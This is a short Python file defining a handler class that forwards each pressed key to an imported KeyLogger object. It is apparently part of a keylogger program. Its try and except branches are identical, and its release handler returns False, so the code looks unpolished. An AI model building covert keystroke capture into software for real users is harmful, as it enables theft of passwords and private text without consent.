from keylogger import KeyLogger  # noqa: F401


class KeyStrokeHandler:
    def __init__(self, keylogger: KeyLogger):
        self.keylogger = keylogger

    def on_press(self, key):
        try:
            self.keylogger.log_keys(key)
        except AttributeError:
            self.keylogger.log_keys(key)

    def on_release(self, key):
        return False
